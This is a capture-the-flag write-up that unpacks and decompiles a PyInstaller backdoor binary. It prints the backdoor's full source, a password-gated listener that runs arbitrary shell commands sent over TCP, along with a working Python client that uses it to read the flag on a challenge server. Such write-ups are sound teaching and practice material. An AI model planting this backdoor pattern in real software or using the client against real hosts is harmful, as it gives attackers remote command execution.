**Description**: One of our friends has left a backdoor on the extraterrestrials’ server. If we manage to take advantage of it, we will be able to control all the doors and lock them outside or open doors to facilities we have no access.

**Stars**: 2/5

**Downloadable**:
bd - ELF binary

**Goal**: Analyze the backdoor and see how to exploit it

**Solution**: 

After quick check bd turns out to be a pyinstaller packed binary (if you don't know how to check it, look for the strings like `_PYI_PROCNAME` or `_MEIPASS2` in the binary).

We can unpack it with pyinstxtractor: https://github.com/extremecoders-re/pyinstxtractor

After unpacking we will get a bd.pyc file that we still need to decompile to python code. I used uncompyle6 for this: https://pypi.org/project/uncompyle6/

At this point we end up with following python code:

```python
import socket
from hashlib import md5
from subprocess import check_output
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('0.0.0.0', 4433))
sock.listen(5)
while True:
    client, addr = sock.accept()
    data = client.recv(32)
    if len(data) != 32:
        client.close()
    elif data.decode() != md5(b's4v3_th3_w0rld').hexdigest():
        client.send(b'Invalid')
        client.close()
    else:
        size = client.recv(1)
        command = client.recv(int.from_bytes(size, 'little'))
        if not command.startswith(b'command:'):
            client.close()
        else:
            command = command.replace(b'command:', b'')
            output = check_output(command, shell=True)
            client.send(output)
            client.close()
```

It looks like we need to send 3 specific packets. First one a binary string `s4v3_th3_w0rld` then the length of next command, and a linux command with a prefix `command:`

Following code gave me the flag:

```python
import socket
import sys
import select
from hashlib import md5

def main():
    server_address = ('188.166.145.178',30607)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('connecting to %s port %s' % server_address, file=sys.stderr)
    sock.connect(server_address)
    msg = md5(b's4v3_th3_w0rld').hexdigest()
    print("Sending: " + msg)
    socket_send(sock,(msg).encode())
    msg = 'command:cat flag.txt'
    msg_len = len(msg)
    print("Sending: " + str(msg_len))
    socket_send(sock,bytes([msg_len]))
    print("Sending: " + msg)
    socket_send(sock,msg.encode())
    data = socket_receive(sock)
    print(data.decode())


def socket_receive(sock):
    data = b''
    try:
        amount_expected = 4096
        ready = select.select([sock], [], [], 2)
        data = sock.recv(amount_expected)
    finally:
        return data

def socket_send(sock, data):
    try:
        sock.send(data)
    except:
        print("Couldn't send data")


if __name__ == "__main__":
    main()
```